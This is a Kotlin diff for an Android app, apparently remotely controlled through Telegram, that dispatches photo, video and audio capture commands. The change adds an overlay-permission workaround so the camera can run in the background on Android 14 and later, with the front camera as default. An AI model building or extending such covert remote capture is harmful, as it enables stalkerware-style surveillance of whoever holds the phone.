@@ -1,14 +1,12 @@
 package com.save.me
 
 import android.content.Context
+import android.os.Build
 import android.util.Log
+import android.view.SurfaceHolder
 import org.json.JSONObject
-import com.save.me.ForegroundActionService
 
 object ActionHandlers {
-    /**
-     * Dispatches remote actions based on incoming command parameters.
-     */
     fun dispatch(
         context: Context,
         type: String,
@@ -21,36 +19,34 @@ object ActionHandlers {
         Log.d("ActionHandlers", "Dispatching type=$type camera=$camera flash=$flash quality=$quality duration=$duration chatId=$chatId")
         try {
             val deviceNickname = Preferences.getNickname(context) ?: "Device"
-            // Send Telegram acknowledgement before starting the action
             if (!chatId.isNullOrBlank()) {
                 val ackMsg = "[$deviceNickname] Command received: $type"
                 UploadManager.init(context)
                 UploadManager.sendTelegramMessage(chatId, ackMsg)
             }
-            when (type) {
-                "photo" -> {
-                    val cam = camera ?: "front"
-                    val flashEnabled = flash == "true"
-                    val qualityInt = quality?.filter { it.isDigit() }?.toIntOrNull() ?: 1080
-                    val durationInt = duration?.toIntOrNull() ?: 0
 
-                    ForegroundActionService.startCameraAction(
-                        context,
-                        type,
-                        JSONObject().apply {
-                            put("camera", cam)
-                            put("flash", flashEnabled)
-                            put("quality", qualityInt)
-                            put("duration", durationInt)
-                        },
-                        chatId
-                    )
+            var surfaceHolder: SurfaceHolder? = null
+            if (Build.VERSION.SDK_INT >= 34) {
+                if (type == "photo" || type == "video") {
+                    if (!OverlayHelper.hasOverlayPermission(context)) {
+                        OverlayHelper.requestOverlayPermission(context)
+                        NotificationHelper.showNotification(
+                            context,
+                            "Permission Needed",
+                            "Grant 'Display over other apps' for full background capability."
+                        )
+                        return
+                    }
+                    surfaceHolder = OverlayHelper.showOverlayWithSurface(context)
                 }
-                "video" -> {
+            }
+
+            when (type) {
+                "photo", "video" -> {
                     val cam = camera ?: "front"
                     val flashEnabled = flash == "true"
-                    val qualityInt = quality?.filter { it.isDigit() }?.toIntOrNull() ?: 480
-                    val durationInt = duration?.toIntOrNull() ?: 60
+                    val qualityInt = quality?.filter { it.isDigit() }?.toIntOrNull() ?: if (type == "photo") 1080 else 480
+                    val durationInt = duration?.toIntOrNull() ?: if (type == "photo") 0 else 60
 
                     ForegroundActionService.startCameraAction(
                         context,
@@ -61,7 +57,8 @@ object ActionHandlers {
                             put("quality", qualityInt)
                             put("duration", durationInt)
                         },
-                        chatId
+                        chatId,
+                        surfaceHolder
                     )
                 }
                 "audio" -> {
